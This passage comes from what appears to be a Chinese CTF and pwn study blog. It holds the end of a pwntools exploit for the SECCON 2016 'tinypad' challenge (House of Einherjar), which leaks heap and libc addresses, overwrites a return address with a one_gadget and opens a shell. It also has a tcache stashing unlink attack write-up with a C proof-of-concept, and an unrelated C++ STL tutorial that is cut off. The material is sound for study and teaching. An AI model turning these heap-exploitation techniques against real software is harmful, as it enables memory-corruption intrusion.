class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br><br>    p.recvuntil(<span class="hljs-string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;D&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content, ok=<span class="hljs-literal">True</span></span>):<br>    p.recvuntil(<span class="hljs-string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;E&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(content)<br>    p.recvuntil(<span class="hljs-string">&quot;(Y/n)&gt;&gt;&gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> ok:<br>        p.sendline(<span class="hljs-string">&quot;Y&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">&quot;n&quot;</span>)<br><br><span class="hljs-comment">#stage one</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x80</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot; #   INDEX: 1\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot; # CONTENT: &quot;</span>)<br>heap = u64(p.recvline().rstrip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x120</span><br>log.info(<span class="hljs-string">&quot;heap_base: %s&quot;</span> % <span class="hljs-built_in">hex</span>(heap))<br>p.recvuntil(<span class="hljs-string">&quot; #   INDEX: 3\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot; # CONTENT: &quot;</span>)<br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x58</span><br>log.info(<span class="hljs-string">&quot;main_arena: %s&quot;</span> % <span class="hljs-built_in">hex</span>(main_arena))<br><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#stage two</span><br>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0xf8</span> + p64(<span class="hljs-number">0x11</span>))<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">0xf8</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0xf8</span>)<br>tinypad = <span class="hljs-number">0x602040</span><br>offset = heap + <span class="hljs-number">0x20</span> - <span class="hljs-number">0x602040</span> - <span class="hljs-number">0x20</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(<span class="hljs-number">0x602060</span>) * <span class="hljs-number">2</span><br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">b&quot;D&quot;</span>*<span class="hljs-number">0x20</span> + fake_chunk)<br>zero_byte_number = <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(p64(offset).strip(<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(zero_byte_number+<span class="hljs-number">1</span>):<br>  data = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x10</span> + p64(offset).strip(<span class="hljs-string">b&quot;\x00&quot;</span>).rjust(<span class="hljs-number">8</span>-i, <span class="hljs-string">b&#x27;f&#x27;</span>)<br>  edit(<span class="hljs-number">1</span>, data)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;D&quot;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(main_arena + <span class="hljs-number">0x58</span>)*<span class="hljs-number">2</span>)<br>gdb.attach(p)<br>pause()<br><br><span class="hljs-comment">#stage three</span><br>libc_base = main_arena + <span class="hljs-number">0x58</span> - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base: %s&quot;</span> % <span class="hljs-built_in">hex</span>(libc_base))<br>one_gadget =  libc_base + <span class="hljs-number">0xf1147</span><br>environ_pointer = libc_base + libc.symbols[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br>add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0xd0</span> + p64(<span class="hljs-number">0x18</span>) + p64(environ_pointer) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0x602148</span>))<br>p.recvuntil(<span class="hljs-string">&quot; #   INDEX: 1\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot; # CONTENT: &quot;</span>)<br>main_ret = u64(p.recvline().rstrip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x8</span>*<span class="hljs-number">30</span><br>log.info(<span class="hljs-string">&quot;environ_addr: %s&quot;</span> % <span class="hljs-built_in">hex</span>(main_ret))<br>edit(<span class="hljs-number">2</span>, p64(main_ret))<br>edit(<span class="hljs-number">1</span>, p64(one_gadget))<br>p.sendline(<span class="hljs-string">&#x27;Q&#x27;</span>)<br><span class="hljs-comment">#p.recvall()</span><br>p.interactive()<br><span class="hljs-comment">#pause()</span><br><br><span class="hljs-comment">#onegadget</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL || &#123;[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...&#125; is a valid argv</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/qq_33528164/article/details/79993399">Tinypad Seccon CTF 2016(House Of Einherjar)</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/#2016-seccon-tinypad">ctfwiki-House Of Einherjar</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/117112930">好好说话之House Of Einherjar</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> House </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache_attack(2)-tcache stashing unlink attack</title>
      <link href="/2024/11/10/tcache-attck/"/>
      <url>/2024/11/10/tcache-attck/</url>
      
        <content type="html"><![CDATA[<h1 id="Tcache-Attack-2-tcache-stashing-unlink-attack"><a href="#Tcache-Attack-2-tcache-stashing-unlink-attack" class="headerlink" title="Tcache_Attack(2)-tcache stashing unlink attack"></a>Tcache_Attack(2)-tcache stashing unlink attack</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>这种攻击利用的是tcache bin中有剩余，同大小的small bin会放进tcache,这种情况可以使用calloc分配空间时触发，因为tcache分配不从tcachebin 中获取，在获取一个smallbin 中的chunk后，如果tcachebin中有足够的空间，smallbin 会把剩余的chunk挂进tcachebin中，这个过程只会对第一个bin进行检查，对后面的堆块没有，如果我们能修改smallbin 中chunk的bk指针，那就有办法把fake_chunk挂进 tcachebin</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-comment">//gcc -g -no-pie hollk.c -o hollk</span><br> <span class="hljs-comment">//patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk</span><br> <span class="hljs-comment">//patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk</span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *target;<br><br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;target addr is:%p\n&quot;</span>,(<span class="hljs-type">void</span>*)target);<br><br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<br>    <br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var;<br>    <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<br><br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;target now: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)target);<br><br>    <span class="hljs-built_in">assert</span>(target == &amp;stack_var[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这段代码的意思就是申请9个chunk，然后释放掉，其中tcachebin被填满了之后，有两个chunk进入smallbin</p><p>分别位chunk1,chunk3,用malloc申请从tcachebin中拿走两个chunk，让tcachebin处于不满的状态，然后把chunk3的bk指针改成target  chunk,让target挂入smallbin,这时候用calloc从smallbin拿走了chunk1，而tcachbing中刚好有两个空位，smallbin 就会把chunk3和targetchunk挂进tcachebin,其中的检查只会检查chunk3,而chunk3是完整的，所以能通过检查</p><p>执行完两个循环后的bin如下图</p><p><img src="/img/tcache-attck/a"></p><p>malloc从tcachebin拿走两个chunk</p><p><img src="/img/tcache-attck/b"></p><p>更改chunk3的bk指针，target被挂进smallbin</p><p><img src="/img/tcache-attck/c"></p><p>calloc从smallbin 拿走一个chunk，重新分配空间后</p><p><img src="/img/tcache-attck/d"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/qq_41202237/article/details/113604261">好好说话之Tcache Attack（3）：tcache stashing unlink attack</a>(本文所有图片来源)</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#0x04-tcache-check">ctfwiki-Tcache attack</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> tcachebin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++入门</title>
      <link href="/2024/11/03/c++-%E5%85%A5%E9%97%A8/"/>
      <url>/2024/11/03/c++-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="c-入门"><a href="#c-入门" class="headerlink" title="c++入门"></a>c++入门</h1><h2 id="STL标准模板库"><a href="#STL标准模板库" class="headerlink" title="STL标准模板库"></a>STL标准模板库</h2><h3 id="容器（Containers）"><a href="#容器（Containers）" class="headerlink" title="容器（Containers）"></a>容器（Containers）</h3><p>容器是STL的核心组件之一，提供了各种数据结构，如向量、列表、集合、映射等。这些容器提供了不同的操作和特性，可以根据需要选择合适的容器。</p><p>以下是一些常用的STL容器：</p><p>vector：动态数组，提供快速的随机访问。<br>list：双向链表，支持快速插入和删除操作。<br>set：有序集合，存储唯一的元素。<br>map：有序映射，存储键值对。<br>stack：堆栈，先进后出（LIFO）的数据结构。<br>queue：队列，先进先出（FIFO）的数据结构。</p><h4 id="vector（动态数组）"><a href="#vector（动态数组）" class="headerlink" title="vector（动态数组）"></a>vector（动态数组）</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>std::vector&lt;T&gt; vec;  <span class="hljs-comment">// 创建一个空的 vector，元素类型为 T</span><br><span class="hljs-function">std::vector&lt;T&gt; <span class="hljs-title">vec</span><span class="hljs-params">(n)</span></span>;  <span class="hljs-comment">// 创建包含 n 个默认初始化的元素的 vector</span><br><span class="hljs-function">std::vector&lt;T&gt; <span class="hljs-title">vec</span><span class="hljs-params">(n, value)</span></span>;  <span class="hljs-comment">// 创建包含 n 个初始化为 value 的元素的 vector</span><br><span class="hljs-function">std::vector&lt;T&gt; <span class="hljs-title">vec</span><span class="hljs-params">(begin, end)</span></span>;  <span class="hljs-comment">// 创建包含范围 [begin, end) 内的元素的 vector</span><br><span class="hljs-function">std::vector&lt;T&gt; <span class="hljs-title">vec</span><span class="hljs-params">(other)</span></span>;  <span class="hljs-comment">// 创建另一个 vector 的副本</span><br></code></pre></td></tr></table></figure><h5 id="常用成员函数"><a href="#常用成员函数" class="headerlink" title="常用成员函数"></a>常用成员函数</h5><ul><li>size()：返回 vector 中的元素数量。</li><li>empty()：检查 vector 是否为空。</li><li>push_back(value)：在 vector 的末尾添加一个元素。</li><li>pop_back()：删除 vector 的最后一个元素。</li><li>front()：访问 vector 的第一个元素。</li><li>back()：访问 vector 的最后一个元素。</li><li>clear()：清空 vector 中的所有元素。</li><li>insert(position, value)：在指定位置插入一个元素。</li><li>erase(position)：删除指定位置的元素。</li><li>erase(begin, end)：删除指定范围内的元素。</li></ul><p>遍历动态数组元素</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-keyword">for</span> (int <span class="hljs-built_in">num</span> : vec)<br>&#123;<br><span class="hljs-built_in">std</span>::cout &lt;&lt; <span class="hljs-built_in">num</span> &lt;&lt; <span class="hljs-built_in">std</span>::endl;<br>&#125;<br><span class="hljs-built_in">std</span>::cout &lt;&lt; <span class="hljs-built_in">std</span>::endl;<br></code></pre></td></tr></table></figure><h4 id="list（双向链表）"><a href="#list（双向链表）" class="headerlink" title="list（双向链表）"></a>list（双向链表）</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;list&gt;</span></span><br>std::list&lt;T&gt; lst;  <span class="hljs-comment">// 创建一个空的 list，元素类型为 T</span><br><span class="hljs-function">std::list&lt;T&gt; <span class="hljs-title">lst</span><span class="hljs-params">(n)</span></span>;  <span class="hljs-comment">// 创建包含 n 个默认初始化的元素的 list</span><br><span class="hljs-function">std::list&lt;T&gt; <span class="hljs-title">lst</span><span class="hljs-params">(n, value)</span></span>;  <span class="hljs-comment">// 创建包含 n 个初始化为 value 的元素的 list</span><br><span class="hljs-function">std::list&lt;T&gt; <span class="hljs-title">lst</span><span class="hljs-params">(begin, end)</span></span>;  <span class="hljs-comment">// 创建包含范围 [begin, end) 内的元素的 list</span><br><span class="hljs-function">std::list&lt;T&gt; <span class="hljs-title">lst</span><span class="hljs-params">(other)</span></span>;  <span class="hljs-comment">// 创建另一个 list 的副本</span><br></code></pre></td></tr></table></figure><h5 id="常用成员函数-1"><a href="#常用成员函数-1" class="headerlink" title="常用成员函数"></a>常用成员函数</h5><ul><li>size()：返回 list 中的元素数量。</li><li>empty()：检查 list 是否为空。</li><li>push_back(value)：在 list 的末尾添加一个元素。</li><li>push_front(value)：在 list 的开头添加一个元素。</li><li>pop_back()：删除 list 的最后一个元素。</li><li>pop_front()：删除 list 的第一个元素。</li><li>front()：访问 list 的第一个元素。</li><li>back()：访问 list 的最后一个元素。</li><li>clear()：清空 list 中的所有元素。</li><li>insert(position, value)：在指定位置插入一个元素。</li><li>erase(position)：删除指定位置的元素。</li><li>erase(begin, end)：删除指定范围内的元素。</li></ul><h4 id="map（关联容器）"><a href="#map（关联容器）" class="headerlink" title="map（关联容器）"></a>map（关联容器）</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p><code>map</code> 是一个关联容器，它提供了一对一的键值对存储和访问功能。它基于红黑树</p><p>实现，具有自动排序的特性，键值对按键进行排序，并且可以快速地进行插入、删除和查找操作。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br>std::map&lt;Key, T&gt; mp;  <span class="hljs-comment">// 创建一个空的 map，键类型为 Key，值类型为 T</span><br><span class="hljs-function">std::map&lt;Key, T&gt; <span class="hljs-title">mp</span><span class="hljs-params">(other)</span></span>;  <span class="hljs-comment">// 创建另一个 map 的副本</span><br></code></pre></td></tr></table></figure><h5 id="常用成员函数-2"><a href="#常用成员函数-2" class="headerlink" title="常用成员函数"></a>常用成员函数</h5><ul><li><p>size()：返回 map 中的键值对数量。</p></li><li><p>empty()：检查 map 是否为空。</p></li><li><p>insert({key, value})：插入一个键值对到 map 中。</p></li><li><p>erase(key)：删除指定键的键值对。</p></li><li><p>clear()：清空 map 中的所有键值对。</p></li><li><p>find(key)：查找指定键对应的迭代器。</p></li><li><p>begin()：返回指向第一个键值对的迭代器。</p></li><li><p>end()：返回指向最后一个键值对之后的迭代器。</p></li></ul><p>遍历map容器的元素</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; pair : mp) &#123;<br>        std::cout &lt;&lt; pair.first &lt;&lt; <span class="hljs-string">&quot;: &quot;</span> &lt;&lt; pair.second &lt;&lt; std::endl;  <span class="hljs-comment">// 遍历并输出键值对</span><br>    &#125;<br><span class="hljs-comment">//const auto是c++里面的一个引用</span><br><br></code></pre></td></tr></table></figure><h4 id="set（关联容器）"><a href="#set（关联容器）" class="headerlink" title="set（关联容器）"></a>set（关联容器）</h4><h5 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h5><p><code>set</code> 是一个关联容器，它存储唯一的元素，且自动按照键进行排序。<code>set</code> 的底层实现基于红黑树，具有快速的插入、删除和查找操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br>std::set&lt;T&gt; st;  <span class="hljs-comment">// 创建一个空的 set，元素类型为 T</span><br><span class="hljs-function">std::set&lt;T&gt; <span class="hljs-title">st</span><span class="hljs-params">(other)</span></span>;  <span class="hljs-comment">// 创建另一个 set 的副本</span><br></code></pre></td></tr></table></figure><h5 id="常用成员函数-3"><a href="#常用成员函数-3" class="headerlink" title="常用成员函数"></a>常用成员函数</h5><ul><li>size()：返回 set 中的元素数量。</li><li>empty()：检查 set 是否为空。</li><li>insert(value)：向 set 中插入一个元素。</li><li>erase(value)：删除 set 中指定的元素。</li><li>clear()：清空 set 中的所有元素。</li><li>find(value)：查找 set 中是否存在指定的元素。</li><li>begin()：返回指向第一个元素的迭代器。</li><li>end()：返回指向最后一个元素之后的迭代器。</li></ul><h4 id="stack（适配器容器）"><a href="#stack（适配器容器）" class="headerlink" title="stack（适配器容器）"></a>stack（适配器容器）</h4><h5 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h5><p><code>stack</code> 是一个适配器容器，它提供了栈（先进后出）的行为。<code>stack</code> 内部使用其他容器作为其底层实现，默认情况下使用 <code>deque</code> 作为底层容器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br>std::stack&lt;T&gt; stk;  <span class="hljs-comment">// 创建一个空的 stack，元素类型为 T</span><br></code></pre></td></tr></table></figure><h5 id="常用成员函数-4"><a href="#常用成员函数-4" class="headerlink" title="常用成员函数"></a>常用成员函数</h5><ul><li><code>size()</code>：返回 stack 中的元素数量。</li><li><code>empty()</code>：检查 stack 是否为空。</li><li><code>push(value)</code>：将元素压入 stack。</li><li><code>pop()</code>：弹出 stack 的顶部元素。</li><li><code>top()</code>：返回 stack 的顶部元素的引用。</li></ul><h4 id="queue（适配器容器）"><a href="#queue（适配器容器）" class="headerlink" title="queue（适配器容器）"></a>queue（适配器容器）</h4><h5 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h5><p><code>queue</code> 是一个适配器容器，它提供了队列（先进先出）的行为。<code>queue</code> 内部使用其他容器作为其底层实现，默认情况下使用 <code>deque</code> 作为底层容器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br>std::queue&lt;T&gt; que;  <span class="hljs-comment">// 创建一个空的 queue，元素类型为 T</span><br></code></pre></td></tr></table></figure><h5 id="常用成员函数-5"><a href="#常用成员函数-5" class="headerlink" title="常用成员函数"></a>常用成员函数</h5><p>size()：返回 queue 中的元素数量。<br>empty()：检查 queue 是否为空。<br>push(value)：将元素加入到 queue 的末尾。<br>pop()：移除 queue 的首个元素。<br>front()：返回 queue 的首个元素的引用。<br>back()：返回 queue 的末尾元素的引用。</p><h3 id="STL算法"><a href="#STL算法" class="headerlink" title="STL算法"></a>STL算法</h3><h4 id="std-reverse"><a href="#std-reverse" class="headerlink" title="std::reverse()"></a>std::reverse()</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">template&lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BidirIt</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">reverse</span>( <span class="hljs-title">BidirIt</span> <span class="hljs-title">first</span>, <span class="hljs-title">BidirIt</span> <span class="hljs-title">last</span> )</span>;<br>first 和 <span class="hljs-keyword">last</span>：定义了容器中要进行反转的元素的范围。这个范围是一个双向迭代器（Bidirectional Iterator），可以在正向和反向方向上进行遍历。<br></code></pre></td></tr></table></figure><h4 id="std-replace"><a href="#std-replace" class="headerlink" title="std::replace()"></a>std::replace()</h4><p><code>std::replace()</code> 算法用于将容器中的指定值替换为另一个值。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt; <span class="hljs-keyword">class</span> ForwardIt, <span class="hljs-keyword">class</span> T &gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">replace</span><span class="hljs-params">( ForwardIt first, ForwardIt last, <span class="hljs-type">const</span> T&amp; old_value, <span class="hljs-type">const</span> T&amp; new_value )</span></span>;<br>first 和 last：定义了容器中要进行替换的元素的范围。<br>old_value：要替换的旧值。<br>new_value：要替换成的新值。<br></code></pre></td></tr></table></figure><h4 id="std-transform"><a href="#std-transform" class="headerlink" title="std::transform()"></a>std::transform()</h4><p>算法用于对容器中的元素应用一个操作，并将结果存储到另一个容器中</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta">template&lt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">InputIt</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">OutputIt</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnaryOperation</span> &gt;<br>OutputIt transform( InputIt first1, InputIt last1, OutputIt d_first, UnaryOperation unary_op );<br>first1 和 last1：定义了输入容器中要应用操作的元素的范围。<br>d_first：定义了输出容器的起始位置，用于存储操作的结果。<br>unary_op：要应用的一元操作，可以是函数对象、函数指针或 Lambda 表达式。<br></code></pre></td></tr></table></figure><h4 id="std-for-each"><a href="#std-for-each" class="headerlink" 